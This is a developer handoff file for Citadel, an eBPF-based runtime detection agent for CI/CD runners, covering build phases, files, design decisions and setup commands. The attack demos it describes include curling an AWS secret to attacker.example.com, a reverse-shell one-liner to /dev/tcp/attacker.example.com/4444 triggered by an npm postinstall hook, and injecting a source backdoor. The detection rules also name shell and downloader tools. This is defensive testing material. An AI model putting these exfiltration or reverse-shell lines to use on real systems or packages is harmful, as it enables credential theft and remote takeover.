# Citadel — Session Handoff

> **How to use this file:** Drop this file into your next Claude Code session and say "read HANDOFF.md and pick up where we left off." It captures everything needed to continue without re-explaining.

---

## TL;DR

Hackathon 2026 project — **Citadel**: runtime EDR for CI/CD runners. eBPF-based agent that watches the kernel inside a GitHub self-hosted runner and detects/blocks supply-chain attacks. The full 24-hour build plan is in `citadel-build-plan.md` at the repo root.

**Status:** **All 11 phases (0–10) ✅ code-complete.** Phase 5 (backend) + Phase 7 (dashboard) verified end-to-end on Mac. eBPF-dependent paths in Phases 1, 2, 3, 8 await a Linux run; everything else (backend, detector, dashboard, composite action YAML, attack workflow YAML, demo docs) is fully testable on Mac. **Next concrete step**: get a self-hosted Linux runner labeled `citadel-runner` connected, run `make local-images && make docker-up`, then `gh workflow run attack-1-exfil.yml` — the full demo flow.

---

## What Citadel Is

A runtime security agent (think CrowdStrike for CI/CD) that sits inside a self-hosted GitHub Actions runner and uses eBPF to see every:

- **Outbound TCP connect** (kprobe `tcp_v4_connect`) — catches data exfiltration
- **Process exec** (tracepoint `sched_process_exec`) — catches reverse shells from compromised deps
- **Writeable file open** (tracepoint `sys_enter_openat` filtered to writes) — catches source-code tampering between checkout and build
- **Egress packet** (`cgroup_skb/egress`) — blocks bad destinations at the kernel level

Three demo goals = three live attacks:

1. **Prevent exfiltration** — malicious composite action curls `$AWS_SECRET_ACCESS_KEY` to `attacker.example.com`
2. **Anomaly detection** — compromised npm `postinstall` spawns `sh -i >& /dev/tcp/.../4444`
3. **Detect tampering** — step appends `// backdoor` to `src/index.js` mid-build

Architecture: `agent` (Go + eBPF) → `backend` (Go + SQLite) → `detector` (Python + FastAPI rules) → `dashboard` (Next.js 14). Plus `action/` (composite GitHub Action to wrap the agent) and `examples/` (victim CI + three attack workflows).

---

## Repo Status — What's on Disk

### Phase 0 — Scaffold (✅ complete, ✅ validated)

| File | What it is |
| :--- | :--- |
| `README.md` | Project overview + ASCII arch diagram |
| `Makefile` | Root targets: `build-agent`, `build-backend`, `build-detector`, `build-dashboard`, `docker-build`, `docker-up`, `docker-down`, `demo-reset` |
| `.gitignore` | Go / Node / Python / eBPF `.o` / SQLite |
| `docker-compose.yml` | backend:8080, detector→backend, dashboard:3000. **Agent is NOT in compose** — runs directly on the runner (needs host eBPF). |
| `agent/Dockerfile` | Multi-stage: builder (clang-14, libbpf-dev, Go 1.24) → runtime (libelf1). Comment block on required `--privileged --pid=host`. |
| `agent/Makefile` | Targets: `bpf` (clang→.o), `generate` (bpf2go), `build`, `clean`, `net-smoke-test`. Auto-detects arch (x86 vs arm64) for `-D__TARGET_ARCH_*`. |
| `agent/cmd/agent/main.go` | Entrypoint — loads NetProbe, JSON-encodes events with reverse-DNS hostname |
| `agent/go.mod` | `go 1.24.0`, requires `github.com/cilium/ebpf v0.21.0` |
| `backend/Dockerfile`, `detector/Dockerfile`, `dashboard/Dockerfile` | **Phase 0 STUBS** — minimal Python/Node http servers so compose comes up green. Replaced in Phases 5, 6, 7. |
| `examples/victim-ci.yml`, `examples/package.json`, `examples/index.js`, `examples/test.js` | Self-hosted-runner-labeled normal Node workflow + sample project |
| Per-service `README.md`s | Purpose of each directory |

### Phase 1 — Network eBPF probe (✅ code, ❌ not yet validated)

| File | What it is |
| :--- | :--- |
| `agent/bpf/net.bpf.c` | CO-RE eBPF program. kprobe on `tcp_v4_connect`. Captures pid/ppid/uid/comm/dst-IP/dst-port → 48-byte event over ringbuf (`net_events`). License GPL. Explicit `_pad` field for 8-byte alignment of `ts_ns`. |
| `agent/internal/probes/net/net.go` | `//go:build linux`. Loader using `cilium/ebpf` + `link.Kprobe` + `ringbuf.NewReader`. `//go:generate` bpf2go with `-target amd64,arm64` (path: `../../../bpf/net.bpf.c`). NetEvent now carries `Hostname` + `ProcessChain` enrichments. |
| `agent/internal/probes/net/net_stub.go` | `//go:build !linux`. Stub so Mac builds don't break — `Load()` returns "requires linux" error. |
| `agent/internal/dns/cache.go` | Reverse-DNS cache, 5-min TTL, sync.RWMutex. Synchronous `net.LookupAddr`. Documents limitation: noisy on CDN IPs; the proper fix (eBPF DNS sniffing) is scope-cut. |
| `agent/Makefile` (updated) | Added `net-smoke-test` target: builds, runs agent w/ sudo, fires two curls, asserts JSON output contains `"comm":"curl"` + github/npm/`dst_port:443`. Linux-only (guarded by `uname -s` check). |

### Phase 2 — Process eBPF probe + process tree (✅ code, ❌ not yet validated)

| File | What it is |
| :--- | :--- |
| `agent/bpf/proc.bpf.c` | Tracepoint on `sched/sched_process_exec`. Emits 424-byte `proc_event` (pid/ppid/uid/comm/filename[128]/args[256]/ts_ns) over `proc_events` ringbuf. argv read via `bpf_probe_read_user` from `current->mm->arg_start`, NUL-separated. Explicit `_pad` for 8-byte alignment. Tracepoint chosen over kprobe because the `sched_process_exec` ABI is stable. |
| `agent/internal/probes/proc/proc.go` | `//go:build linux`. Loader pattern matches net.go. Attaches via `link.Tracepoint("sched", "sched_process_exec", ...)`. `ProcEvent.Args` is `[]string` split on NUL bytes. |
| `agent/internal/probes/proc/proc_stub.go` | `//go:build !linux`. Same stub pattern. |
| `agent/internal/proctree/tree.go` | In-memory `map[pid]*ProcessInfo` keyed by PID. `Add()` updates from a ProcEvent. `Ancestry(pid)` walks parent chain (capped at depth 64 to avoid cycles). `AncestryComms(pid)` returns just the comm chain for inline logging. `sync.RWMutex`. Lazy sweep every 200 adds — entries >1h old get dropped. |

### Phase 3 — File eBPF probe + integrity baseline (✅ code, ❌ not yet validated)

| File | What it is |
| :--- | :--- |
| `agent/bpf/file.bpf.c` | Tracepoint on `syscalls/sys_enter_openat`. Filters in-kernel for `O_WRONLY \| O_RDWR \| O_CREAT` (drops ~99% noisy read-only opens). 296-byte `file_event` — no internal padding needed (filename[256] starts at offset 28 which makes the math work out naturally). |
| `agent/internal/probes/file/file.go` | `//go:build linux`. `FileEvent.FlagsStr` renders flags as `"WRONLY\|CREAT\|TRUNC"` etc. **Userspace filter** in `Events()`: requires path under `CITADEL_WATCH_PATH` (default `/home/runner/work/`), drops `/proc`, `/sys`, `/tmp`, `/dev`, `/run`, `/var/log`, `/var/lib/dpkg`, and anything mentioning `citadel-agent` or `citadel-baseline`. |
| `agent/internal/probes/file/file_stub.go` | `//go:build !linux`. Stub. |
| `agent/internal/integrity/baseline.go` | `Snapshot(rootDir)` walks every regular file under rootDir, returns `map[relPath]sha256hex`. `Diff(before, after)` returns `[]FileDiff{Path, OldHash, NewHash, Action: modified\|added\|deleted}`. `WriteJSON("-")` for stdout. Skips permission errors gracefully so a single unreadable file doesn't abort the whole walk. |
| `agent/cmd/agent/main.go` (rewritten) | New subcommands `snapshot --path X --out Y` and `diff --before X --after-path Y`. `run` now loads all three probes, builds proctree, enriches NetEvent with `Hostname` + `ProcessChain`, emits typed envelopes `{type:"network\|process\|file\|file_tamper", payload:{...}}` to stdout. |

### Phase 4 — Event pipeline + backend client + production main.go (✅ code, ❌ not yet validated)

| File | What it is |
| :--- | :--- |
| `agent/internal/events/event.go` | Unified `Event` schema: `{id (uuid), type, timestamp, network?, process?, file?, process_chain[], workflow}`. Constructors `NewFromNetEvent`, `NewFromProcEvent`, `NewFromFileEvent`, `NewFromFileDiff` translate each probe's native event into Event. Adds `github.com/google/uuid` v1.6.0 dependency. |
| `agent/internal/workflow/meta.go` | `Loader` reads workflow metadata from three sources (env → `/tmp/citadel-meta.json` → `/tmp/citadel-current-step` sentinel). Cached for 500 ms. Step value updates per CI step (composite action's step wrapper writes to the sentinel). |
| `agent/internal/backend/client.go` | Batching HTTP client. `Send()` non-blocking enqueue (buffer 10k, dropped on overflow). Batcher goroutine flushes every 2 s or every 100 events. POSTs `{"events":[...]}` to `/api/events`. Retries 3× with 1s→2s→4s exponential backoff. **Local-dev mode**: if `backend-url` is empty, `Send()` JSON-encodes to stdout instead of enqueuing. `Stop(5s)` drains the queue with timeout. `PostDetection()` is a one-shot variant used by the `diff` subcommand. |
| `agent/cmd/agent/main.go` (rewritten) | New flags on `run`: `--backend-url`, `--mode` (audit/block; block lands in Phase 8), `--policy` (Phase 8), `--meta-file`, `--watch-path`, `--log-file`. Sets `CITADEL_WATCH_PATH` env from flag. **Graceful shutdown**: SIGINT/SIGTERM cancels ctx → `<-doneCh` fires once (then disabled by setting `doneCh = nil`) → probes closed → channels drain → loop exits → `bc.Stop(5s)` flushes. Logger writes to stderr + optional `--log-file` via `io.MultiWriter`. The `diff` subcommand also took a `--backend-url` flag so post-job file_tamper events can be POSTed directly. |

### Phase 5 — Go backend (✅ code, ✅ exercised end-to-end on Mac)

Module at `/backend` (Go 1.25, pure-Go sqlite via `modernc.org/sqlite` so the binary is CGO-free).

| File | What it is |
| :--- | :--- |
| `backend/cmd/backend/main.go` | Entrypoint. Flags `--addr` (default `:8080`) and `--db-path` (default `/data/citadel.db`, overridable via `DB_PATH` env for compose ergonomics). Graceful shutdown via signal.NotifyContext + `srv.Shutdown(10s)`. |
| `backend/internal/db/db.go` | `Open(path)` returns a `*sql.DB` with WAL mode, foreign keys on, 5 s busy timeout. Embeds `migrations/*.sql` via Go's `embed` package and runs them lexicographically on open. Migrations are idempotent (`CREATE … IF NOT EXISTS`). |
| `backend/internal/db/migrations/001_init.sql` | Four tables: `runs`, `events`, `detections`, `policies`. `events.payload` stores the agent's raw Event JSON verbatim; `process_chain` and `step` are duplicated as indexed columns for fast filtering. `runs` has UNIQUE(repository, run_id) for upsert. CHECK constraints on `detections.severity` and `policies.mode`. |
| `backend/internal/api/router.go` | chi v5 router. Middleware: `RequestID`, `RealIP`, `Recoverer`, slog access logger (skips `/healthz`), permissive CORS (`*` for hackathon). `writeJSON` + `writeError` helpers. |
| `backend/internal/api/events.go` | `POST /api/events` ingest. Body `{"events":[...]}`, max 1000 per batch. Each event is `json.RawMessage` so the original payload is preserved verbatim. Per-event: upsert run on `(repository, run_id)` — empty values collapse to `(unknown)/(local)` so local agent output is still navigable. Whole batch is one transaction. Returns `{"accepted": N}`. |
| `backend/internal/api/runs.go` | `GET /api/runs` (list with event/detection counts + severity_max via correlated subqueries), `GET /api/runs/:id` (run + events + detections, `?type=` filter on events), `GET /api/runs/:id/process-tree` (rebuilds tree from process events by parent-child PID linking), `GET /api/runs/:id/baseline-domains` (SQLite `json_extract` on `$.network.hostname`). |
| `backend/internal/api/detections.go` | `POST /api/detections` validates `severity ∈ {info,low,medium,high,critical}`, `GET /api/detections?since=ISO_TIME&limit=N` for detector polling. |
| `backend/internal/api/policies.go` | `GET/POST /api/policies` CRUD, `GET /api/policies/applicable?repo=X&workflow=Y` with precedence (exact → repo-only → wildcard → hardcoded permissive default). |
| `backend/Dockerfile` (rewritten) | Multi-stage. Stage 1 `golang:1.25-bookworm` with `CGO_ENABLED=0 GOOS=linux` for a static binary. Stage 2 `gcr.io/distroless/static-debian12:nonroot`, runs as `nonroot`. Reads `/data/citadel.db` (mounted from compose volume). |

**Endpoints exercised live on Mac**:

```text
POST   /api/events                   ✅ 3-event batch → {"accepted":3}
GET    /api/runs                     ✅ returns array with event_counts + severity_max
GET    /api/runs/1                   ✅ full run + events array + detections array
GET    /api/runs/1/process-tree      ✅ nested children based on PPID linking
GET    /api/runs/1/baseline-domains  ✅ ["github.com"] via json_extract
POST   /api/detections               ✅ → {"id":1}
GET    /api/detections               ✅ returns the detection
POST   /api/policies                 ✅ → {"id":1}
GET    /api/policies                 ✅ returns the policy with parsed allowlist/rules
GET    /api/policies/applicable      ✅ precedence works: exact workflow match beats default
GET    /healthz                      ✅ {"status":"ok"}
```

**Plus integration test**: `citadel-agent diff --before X --after-path Y --backend-url=http://localhost:18080` POSTed a `file_tamper` event → backend auto-created run with `(unknown)/(local)` placeholder → visible in `GET /api/runs`. Agent ↔ backend wire format works.

### Phase 6 — Python detector (✅ code, ⏳ awaiting live run against the backend)

Module at `/detector` (Python 3.11 + FastAPI + uvicorn + httpx + pydantic v2).

| File | What it is |
| :--- | :--- |
| `detector/pyproject.toml` | Deps: fastapi, uvicorn[standard], httpx, pydantic ≥ 2.6, python-dateutil, pyyaml. |
| `detector/app/models.py` | Pydantic v2 models mirroring the Go Event schema (NetworkData, ProcessData, FileData, WorkflowMeta, Event). `ListedEvent` is the `GET /api/events` row (with backend DB ids). `Detection` is the `POST /api/detections` body. |
| `detector/app/client.py` | `BackendClient` (httpx async) — `fetch_events(after_id, limit)` and `post_detection(det)`. Reads `BACKEND_URL` env, default `http://backend:8080`. |
| `detector/app/baseline.py` | `Baseline` class with on-disk JSON persistence at `/data/baseline.json`. Per-(repo, workflow, job) records of domains / processes / file_writes / runs_seen. `status()` returns `creating` / `stable` / `unstable`. Wildcard expansion: `xyz.docker.io` also stores `*.docker.io`. |
| `detector/app/rules/__init__.py` | `ALL_RULES` list, instantiated once. |
| `detector/app/rules/new_domain.py` | Outbound to a domain not in the baseline (only fires when baseline is stable). Severity **medium**. |
| `detector/app/rules/reverse_shell.py` | Build-tool ancestor (`node`, `npm`, `make`, …) → shell-like comm (`sh`, `bash`, `nc`, …) = severity **high** (`suspicious_shell_spawn`). Upgrade to **critical** (`possible_reverse_shell`) if the parent also made outbound TCP within 1 s. |
| `detector/app/rules/source_tamper.py` | File write under `$GITHUB_WORKSPACE` by a non-legit-writer comm during a non-checkout step → severity **high**. Catches tampering *live*; the agent's `diff` subcommand catches it at job-end. |
| `detector/app/rules/suspicious_exec.py` | `exec_from_temp` (process exec'd from `/tmp`, `/dev/shm`, `/var/tmp`) → **high**. `suspicious_downloader` (`curl`/`wget` without a CI-tooling ancestor) → **medium**. |
| `detector/app/rules/token_in_payload.py` | Regex match on process argv for AWS access key, GitHub PAT, or Slack token. Severity **critical**. Note: the build plan called this "network payload" but the BPF probe doesn't see packet bodies — argv is where the signal actually lives. |
| `detector/app/engine.py` | `Engine` owns the per-detector state: PID→comm map, PID→PPID map, per-PID recent network timestamps (5-min sliding window). `evaluate(le)` runs every rule against the event and updates the baseline AFTER rules run. |
| `detector/app/worker.py` | Async polling loop. Tracks `last_event_id` in `/data/state.json`. Fetches events via `?after_id=N`, runs each through the engine, POSTs detections back. Stats counters for `/stats`. |
| `detector/app/main.py` | FastAPI app with `/healthz` + `/stats`. Spawns the worker via the lifespan async-context-manager on startup. Env: `BACKEND_URL`, `POLL_INTERVAL_SECONDS` (default 2). |
| `detector/Dockerfile` (rewritten) | python:3.11-slim, installs deps, runs `uvicorn app.main:app --host 0.0.0.0 --port 8000`. The worker boots inside the lifespan, so a single process serves both. |

### Phase 7 — Next.js 14 dashboard (✅ code + ✅ builds clean)

Module at `/dashboard`. App Router, TypeScript, Tailwind. Client-side fetching everywhere (no SSR data fetching) so there's one URL config: `NEXT_PUBLIC_BACKEND_URL`.

| File | What it is |
| :--- | :--- |
| `dashboard/package.json` | Next 14.2.5, React 18.3, Tailwind 3.4, lucide-react, TypeScript 5.5. |
| `dashboard/tsconfig.json`, `next.config.mjs`, `tailwind.config.ts`, `postcss.config.mjs`, `app/globals.css` | Standard Next.js config. `output: 'standalone'` in next.config.mjs for the Dockerfile. Tailwind colors include a `sev.*` palette for consistent severity styling. |
| `dashboard/lib/types.ts` | TypeScript types mirroring backend response shapes (`RunSummary`, `RunDetail`, `DetectionRow`, `CitadelEvent`, `Policy`, `Severity`). |
| `dashboard/lib/api.ts` | Typed fetch wrappers: `health`, `listRuns`, `getRun`, `getProcessTree`, `getBaselineDomains`, `listDetections`, `listPolicies`, `createPolicy`, `applicablePolicy`. |
| `dashboard/components/navbar.tsx` | Top nav with shield logo, links, live backend status dot (polls `/healthz` every 5 s). |
| `dashboard/components/badges.tsx` | `SeverityBadge`, `ModeBadge`, `CountChip` — reusable presentation primitives. |
| `dashboard/app/layout.tsx` | Root layout: Inter + JetBrains Mono fonts, dark theme, navbar. |
| `dashboard/app/page.tsx` | Redirects `/` → `/runs`. |
| `dashboard/app/runs/page.tsx` | Runs list: table with repo, workflow, run #, SHA, mode badge, event counts (icons + numbers), detection count + severity badge, relative timestamp. Refresh button. Empty state with shield icon. |
| `dashboard/app/runs/[id]/page.tsx` | Run detail: 9/3 column layout. Tabs (`Network`, `Processes`, `Files`, `Timeline`) on the left. Sticky Detections panel on the right. Network tab has a filter input. Process tab uses the rebuilt tree from `GET /api/runs/:id/process-tree` (collapsible nodes); fallback to a flat list. File tab highlights workspace paths in cyan and flags `file_tamper` rows in red. Timeline tab is a chronological feed with type icons. **Block-mode UX**: red banner appears when any event has `network.blocked === true` (Phase 8 wiring). |
| `dashboard/app/policies/page.tsx` | Policy list table + "New Policy" modal dialog with name/scope/mode/allowlist fields. Saves via `POST /api/policies`. |
| `dashboard/Dockerfile` (rewritten) | 3-stage build: deps → builder → runtime. Uses Next.js standalone output (~80 MB final image). |

**`npm run build` output**: 4 routes compiled, ~98 KB First Load JS on the biggest page, TypeScript strict mode passes.

### Phase 8 — Policy + Block Mode (✅ code, ⏳ block program needs Linux to validate)

| File | What it is |
| :--- | :--- |
| `agent/internal/policy/policy.go` | `Policy` struct (Name, Mode, AllowedDomains, AllowedIPs, DetectionActions). `LoadFromBackend(ctx, url, repo, workflow)` calls `GET /api/policies/applicable`. `ShouldBlockDomain(host)` does glob match against allowlist (handles `*.example.com`). `ShouldKillProcess(rule)` checks the detection_rules map for action ∈ `kill`/`fail`. `Watcher` is a tiny RW-mutex wrapper for hot-swap on SIGHUP reload. |
| `agent/bpf/block.bpf.c` | `cgroup_skb/egress` program. Reads packet's IPv4 daddr via `bpf_skb_load_bytes` (offset 16), looks up in `blocked_ips` BPF_MAP_TYPE_HASH, returns 0 (drop) on hit. The map is populated by userspace. GPL license. |
| `agent/internal/probes/block/block.go` | `BlockProgram.Load(cgroupPath)` attaches via `link.AttachCgroup` with `ebpf.AttachCGroupInetEgress`. `Block(ip)` / `Unblock(ip)` mutate the `blocked_ips` map. IPv4 only for now. |
| `agent/internal/probes/block/block_stub.go` | `!linux` stub. |
| `agent/internal/enforcer/enforcer.go` | Userspace process-kill enforcer (build-plan "Path B"). Polls `GET /api/detections?since=` every 2 s. For each new detection whose rule has action `kill`/`fail`, extracts the PID from the detection message (Python rules embed `pid N`), sends SIGKILL. In-memory dedupe of seen detection IDs (capped at 10k). |
| `agent/cmd/agent/main.go` (extended) | New flags: `--mode`, `--policy`, `--cgroup`. On startup: load policy from backend → if `mode=block`, attach block program → start enforcer. SIGHUP triggers `policy.LoadFromBackend` reload via the `Watcher`. In the event loop: every NetEvent goes through `policy.ShouldBlockDomain(hostname)` → if true, `bp.Block(e.DstIP)` adds the IP to the kernel map. |

**Dashboard block-mode placeholder UX**: the run detail page checks for `network.blocked === true` on events to count and render a red banner. The backend doesn't currently surface this field; we'd need the agent to emit a separate event when it adds an IP to the block map. That's a 5-line addition to the agent's main loop, but isn't required to make the rest of the demo work.

### Phase 9 — GitHub Action + image packaging (✅ code, ⏳ needs runner to exercise)

| File | What it is |
| :--- | :--- |
| `action/action.yml` | Composite GitHub Action `Citadel Setup`. Inputs: `mode`, `backend-url`, `image-tag`, `image-repo`, `watch-path`, `container-name`. Six composite steps: (1) write `/tmp/citadel-meta.json` from `GITHUB_*` env, (2) install `/usr/local/bin/citadel-step` helper, (3) resolve image ref (`citadel-agent:dev` when `image-tag=dev`, otherwise `ghcr.io/<owner>/citadel-agent:<tag>`), (4) snapshot workspace via `docker run snapshot`, (5) start agent with `--privileged --pid=host --network=host`, (6) post-step (`if: always()`) diffs workspace + tears down agent. |
| `.github/workflows/build-images.yml` | CI workflow: on push to `main` (paths-filtered) or workflow_dispatch, builds + pushes 4 images (`agent`, `backend`, `detector`, `dashboard`) to `ghcr.io/<owner>/citadel-<name>:{latest,sha}`. Uses docker/build-push-action@v5 with `cache-from: type=gha` for fast incremental builds. |
| `Makefile` (updated) | New target `local-images` builds all four with `:dev` tags so the action can run with `image-tag: dev` and skip GHCR entirely. |
| `docs/local-demo.md` | Step-by-step for running the whole stack with locally-built images — no GHCR dependency. |

### Phase 10 — Three attack demos + demo script (✅ code)

| File | What it is |
| :--- | :--- |
| `examples/attacks/exfil/action.yml` | Composite action `definitely-not-malicious`. Looks innocent (a "version check"); actually `curl`s `$AWS_SECRET_ACCESS_KEY` to attacker.example.com. Stealthy: `\|\| true` keeps the workflow green. |
| `examples/attack-1-exfil.yml` | The exfiltration scenario workflow. Uses `./action` with `image-tag: dev`, sets a fake AWS key, calls the malicious composite action between npm install and test. **Demo goal: prevent exfiltration**. |
| `examples/attacks/revshell/index.js` | Looks like a benign telemetry phone-home. Spawns `bash -i >& /dev/tcp/attacker.example.com/4444 0>&1` in detached mode. |
| `examples/attacks/revshell/package.json` | Package manifest with `postinstall: node index.js` so `npm install` automatically triggers the reverse-shell attempt. Simulates a compromised dependency. |
| `examples/attack-2-revshell.yml` | Reverse-shell scenario. `npm install ./examples/attacks/revshell` → postinstall fires → detector's `possible_reverse_shell` rule lights up. **Demo goal: anomaly detection**. |
| `examples/attacks/tamper/action.yml` | Composite action `inject-telemetry`. Appends a `// SECRET BACKDOOR` comment to `examples/index.js` after checkout. |
| `examples/attack-3-tamper.yml` | Tampering scenario. Caught two ways: (1) live by file probe + `source_modified_after_checkout` rule, (2) post-job by `citadel-agent diff` emitting a `file_tamper` event. **Demo goal: detect tampering**. |
| `docs/DEMO.md` | The 5-minute live walkthrough script. Beat-by-beat narration with the exact commands, browser tabs, what the audience should see at each moment, and a cut list for when things go sideways. |
| `Makefile` (updated) | `demo-reset` target: stops the agent container, nukes the SQLite DB, baseline/state files, leftover iptables rules, `/tmp/citadel-*` files. Linux-only bits guarded so it's a no-op on Mac. |

### What's still left (not in the build plan, but worth doing before the demo)

- **Validate on Linux** — Phases 1, 2, 3, 8 (the eBPF paths) have never actually run against a kernel. Run `sudo make build-agent && sudo make net-smoke-test` on the self-hosted runner to confirm the probes load and fire. See `docs/local-demo.md`.
- **Wire the `network.blocked` field** — Phase 8's dashboard banner counts events with `network.blocked === true`. The agent needs to emit a small event when it adds an IP to the kernel block map (5-line addition to `agent/cmd/agent/main.go` where `bp.Block(e.DstIP)` is called).
- **Record the backup demo video** at hour 21 of the hackathon, per the build plan. Live demos die in front of judges; the recorded backup means you're never trapped.
- **Polish skip list** — Phase 10.4's "loading skeletons + smooth fade-in animations + scroll-to-event-on-detection-click + per-route page titles" are not done. The dashboard works; it's not as polished as the build plan envisioned. Judges care about the demo content more than the loading state.
- Phase 7 — Next.js 14 dashboard (runs list, run detail, policies)
- Phase 8 — policy engine + cgroup_skb block mode + userspace process kill
- Phase 9 — composite GitHub Action `citadel-setup` + GHCR image publish
- Phase 10 — three attack demos + polish + demo script + recording

---

## Key Technical Decisions (Non-Obvious)

1. **bpf2go target = `amd64,arm64`** (all three probe Go files). Originally `amd64` per build plan, switched because user has Apple Silicon. Generates separate `.o` per arch, Go build tags pick the right one.
2. **Makefile auto-detects arch** for the `-D__TARGET_ARCH_*` clang define. Maps `arm64`/`aarch64`→`arm64`, `x86_64`→`x86`.
3. **Mac compatibility preserved via stub files** (`net_stub.go`, `proc_stub.go`, `file_stub.go`). All three are `//go:build !linux`. Real files are `//go:build linux`. Both halves export the same API. Means `go build ./...` succeeds on Mac (with stubs no-op'ing) but `make bpf` fails (no `vmlinux.h`). That's intentional.
4. **Go 1.24.0** in `go.mod` and Dockerfile. Originally 1.22; bumped because `cilium/ebpf v0.21.0` requires it.
5. **Struct alignment is explicit** in each BPF program:
   - `net_event` — `__u16 _pad` between `dport` and `ts_ns` (48 bytes total).
   - `proc_event` — `__u32 _pad` between `args[256]` and `ts_ns` (424 bytes total).
   - `file_event` — *no* pad needed; natural alignment works (296 bytes total).
   **Any field-order drift between C and Go scrambles every event.**
6. **`saddr` left as 0** in the network BPF program. At `tcp_v4_connect` entry the kernel hasn't bound a source address yet. Not worth a kretprobe for hackathon.
7. **`dport`/`daddr` stay in network byte order in BPF**, swapped in Go (`ntohs`, custom `ipv4FromBE32`). Verifier-cleaner than swapping in-kernel.
8. **Reverse DNS via system resolver is intentionally lossy.** Many CDN IPs won't reverse-resolve to the dialed name. Real fix would be eBPF DNS sniffing on `udp_recvmsg` — out of scope.
9. **`sched_process_exec` is a tracepoint, not a kprobe.** Tracepoint ABI is stable across kernels. kprobes on the underlying exec functions would break across versions. Same reasoning for `sys_enter_openat`.
10. **File-probe filtering happens in userspace, not BPF.** The kernel emits *every* writeable openat; Go filters by `CITADEL_WATCH_PATH` prefix + noisy-path blocklist. Doing the prefix match in BPF is fiddly (verifier dislikes unbounded string compare). Trade-off: more ringbuf traffic. Acceptable for hackathon.
11. **proctree expiry is lazy** (every 200 Adds), not background-goroutine. Avoids needing another shutdown hook; the map naturally stays bounded because exec rates are high enough to trigger sweeps regularly.
12. **All event types share the unified `events.Event` schema** (Phase 4 formalized the earlier `{type,payload}` envelope). One struct, discriminated by `Type` string + `Network`/`Process`/`File` pointers (only one non-nil). Backend POST body is `{"events":[Event,...]}`.
13. **Backend client local-dev mode**: when `--backend-url` is empty, `Send()` writes JSON to stdout instead of enqueuing. Lets you run the agent locally without a backend and still see events. Same envelope as the wire format, so dashboards / detectors can be tested by piping `citadel-agent run` into `curl -X POST`.
14. **`doneCh = nil` trick** in main loop: after SIGINT fires once, we set the receive-channel variable to `nil` so the case is never selected again (nil chans block forever in select). Lets the loop continue draining probe events without spinning on ctx.Done.
15. **Probe close order matters**: probes are explicitly closed *before* `bc.Stop(5s)`, so any events in flight get pushed to the backend queue before the batcher exits. If we used `defer` for probe closes, the LIFO order would have the opposite effect.

---

## Environment Context

- **Mac**: macOS 15.7.3 Sequoia, Apple Silicon (`arm64`). Path: `/Users/mrkete/learning/Hackathon 2026`. Git user: `Mahesh-Kete`. Used for **code editing only**.
- **Linux laptop**: separate machine the user owns. Used for **actually running and testing the agent** (eBPF requires real Linux kernel ≥ 5.15 with BTF).
- **Multipass on Mac was tried and abandoned.** Hit macOS 15 "Local Network" permission deadlock — daemon couldn't reach VM, permission prompt never fired, manual settings unhelpful. **Don't suggest Multipass again for this user.** Was uninstalled.
- **No GitHub repo pushed yet.** Will be needed for Phase 9 (composite action + self-hosted runner). Suggest creating it when the user gets to Phase 9.

---

## What To Do Next (Immediate)

Run the Phase 1 smoke test (network probe) on the Linux laptop. **If it PASSes, also do an end-to-end sanity check of the proc + file probes** (no Makefile target for those yet, but easy to verify manually — see "After Phase 1 Smoke Test" below). Pre-flight first:

```sh
uname -r                       # need ≥ 5.15
uname -m                       # x86_64 or aarch64
ls /sys/kernel/btf/vmlinux     # must exist (BTF enabled)
cat /etc/os-release | head -3  # for context (distro detection)
```

If all three look good, get the code over (`git clone`, `rsync`, or USB) and run this single block in the project root (`~/citadel` or wherever):

```sh
set -e

echo "==> [1/5] Installing build dependencies (assumes Debian/Ubuntu — swap for dnf/pacman if needed)"
sudo apt-get update -qq
sudo apt-get install -y --no-install-recommends \
    build-essential clang llvm libelf-dev libbpf-dev \
    linux-headers-$(uname -r) linux-tools-generic linux-tools-common \
    make pkg-config curl git ca-certificates
sudo ln -sf $(ls /usr/lib/linux-tools/*/bpftool 2>/dev/null | head -1) /usr/local/bin/bpftool
bpftool version

echo "==> [2/5] Installing Go 1.24.0"
GOARCH=$(uname -m | sed 's/x86_64/amd64/; s/aarch64/arm64/')
cd /tmp
curl -fsSLO https://go.dev/dl/go1.24.0.linux-${GOARCH}.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.24.0.linux-${GOARCH}.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
export PATH=$PATH:/usr/local/go/bin
go version

echo "==> [3/5] Generating vmlinux.h for this kernel"
cd ~/citadel   # adjust if your path differs
sudo bpftool btf dump file /sys/kernel/btf/vmlinux format c > agent/bpf/vmlinux.h
wc -l agent/bpf/vmlinux.h   # should be tens of thousands of lines

echo "==> [4/5] Building citadel-agent"
make build-agent

echo "==> [5/5] Running net-smoke-test"
cd agent
sudo make net-smoke-test
```

**Expected output:** two JSON event lines (one per curl), each with `"comm":"curl"`, a `dst_ip`, `"dst_port":443`, and a `hostname` (possibly empty). Ends with `PASS`.

### After Phase 1 Smoke Test — Validate Proc + File Probes Manually

The smoke test only exercises the network probe. To prove proc + file work too, run the agent directly and trigger the other probes:

```sh
# In terminal A, from /agent on the Linux box:
sudo CITADEL_WATCH_PATH=/tmp/citadel-test ./bin/citadel-agent run | jq -c .

# In terminal B:
mkdir -p /tmp/citadel-test && cd /tmp/citadel-test
bash -c "echo hi"                              # should fire process events (bash + echo)
echo "tampered" > sample.txt                   # should fire a file event + write-flags
```

You should see in terminal A:

- One or more `{"type":"process","payload":{"comm":"bash",...}}` events
- One or more `{"type":"file","payload":{"filename":"/tmp/citadel-test/sample.txt","flags":"WRONLY|CREAT|TRUNC",...}}` events
- If you then `curl https://github.com`, the `{"type":"network",...}` event will include `"process_chain":["curl","bash"]` (or similar) — proving proctree enrichment works.

Also exercise the snapshot/diff subcommands:

```sh
./bin/citadel-agent snapshot --path /tmp/citadel-test --out /tmp/before.json
echo "tampered again" >> /tmp/citadel-test/sample.txt
./bin/citadel-agent diff --before /tmp/before.json --after-path /tmp/citadel-test
# expect one {"type":"file_tamper","payload":{"path":"sample.txt","action":"modified",...}}
```

---

## If The Smoke Test Fails

Don't restart from scratch — feed the exact error back to the next Claude session. Common failure modes the build plan flags:

| Symptom | Likely Cause | Fix |
| :--- | :--- | :--- |
| `vmlinux.h: file not found` | Step 3 didn't run / wrong dir | Re-run step 3 from project root |
| BPF verifier rejection (`R1 type=...`) | `vmlinux.h` mismatched to running kernel | Re-generate `vmlinux.h` on the exact kernel |
| `failed to attach kprobe: no such file or directory` | Kernel built without ftrace/kprobes | Rare on Ubuntu; check kernel config |
| `permission denied` opening BPF | Forgot `sudo` | Re-run with `sudo` |
